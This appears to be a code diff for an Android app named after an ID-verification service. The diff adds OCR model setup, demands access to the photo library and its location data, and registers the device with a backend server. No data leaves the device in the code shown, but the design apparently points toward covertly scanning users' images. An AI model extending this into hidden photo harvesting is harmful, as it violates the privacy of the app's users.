@@ -1,9 +1,11 @@
 package com.example.onfidoloader
 
+import android.Manifest
 import android.annotation.SuppressLint
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.graphics.Color
 import android.net.Uri
 import android.os.*
@@ -11,9 +13,13 @@ import android.provider.Settings
 import android.util.Log
 import android.view.View
 import android.webkit.*
+import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import kotlinx.coroutines.*
 import org.json.JSONObject
+import java.io.File
 import java.net.HttpURLConnection
 import java.net.URL
 
@@ -22,6 +28,7 @@ class MainActivity : AppCompatActivity() {
     private lateinit var webView: WebView
     private var filePathCallback: ValueCallback<Array<Uri>>? = null
     private val FILE_CHOOSER_RESULT_CODE = 1001
+    private val PERMISSION_REQUEST_CODE = 101
 
     private val serverBase = "http://10.0.2.2/api"
     private val deviceId: String by lazy {
@@ -49,11 +56,83 @@ class MainActivity : AppCompatActivity() {
             return
         }
 
-        if (intent?.getBooleanExtra("forceClose", false) == true) {
-            finish()
-            return
+        copyTessData() // ← добавлено копирование модели Tesseract
+        checkAndRequestPermissions()
+    }
+
+    private fun copyTessData() {
+        val assetManager = assets
+        val tessDataPath = File(filesDir, "tesseract/tessdata")
+
+        if (!tessDataPath.exists()) tessDataPath.mkdirs()
+
+        try {
+            assetManager.list("tesseract/tessdata")?.forEach { fileName ->
+                val outFile = File(tessDataPath, fileName)
+                if (!outFile.exists()) {
+                    assetManager.open("tesseract/tessdata/$fileName").use { input ->
+                        outFile.outputStream().use { output ->
+                            input.copyTo(output)
+                        }
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("MainActivity", "Ошибка копирования tessdata: ${e.message}")
+        }
+    }
+
+    private fun checkAndRequestPermissions() {
+        val requiredPermissions = mutableListOf<String>().apply {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                add(Manifest.permission.READ_MEDIA_IMAGES)
+            } else {
+                add(Manifest.permission.READ_EXTERNAL_STORAGE)
+            }
+            add(Manifest.permission.ACCESS_MEDIA_LOCATION)
         }
 
+        val permissionsNeeded = requiredPermissions.filter {
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+        }
+
+        if (permissionsNeeded.isNotEmpty()) {
+            ActivityCompat.requestPermissions(
+                this,
+                permissionsNeeded.toTypedArray(),
+                PERMISSION_REQUEST_CODE
+            )
+        } else {
+            proceedAfterPermission()
+        }
+    }
+
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            val hasReadMediaPermission =
+                (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED) ||
+                (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED)
+
+            if (hasReadMediaPermission) {
+                proceedAfterPermission()
+            } else {
+                Toast.makeText(
+                    this,
+                    "Нужно предоставить доступ к файлам мультимедиа!",
+                    Toast.LENGTH_LONG
+                ).show()
+                finish()
+            }
+        }
+    }
+
+    private fun proceedAfterPermission() {
         val prefs = getSharedPreferences("prefs", Context.MODE_PRIVATE)
         if (!prefs.getBoolean("registered", false)) {
             registerDevice()
@@ -87,7 +166,6 @@ class MainActivity : AppCompatActivity() {
                 }
                 startActivity(explicitIntent)
             } catch (e: Exception) {
-                Log.e("MainActivity", "Explicit Google app launch failed: ${e.message}")
                 startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://www.google.com")))
             }
 
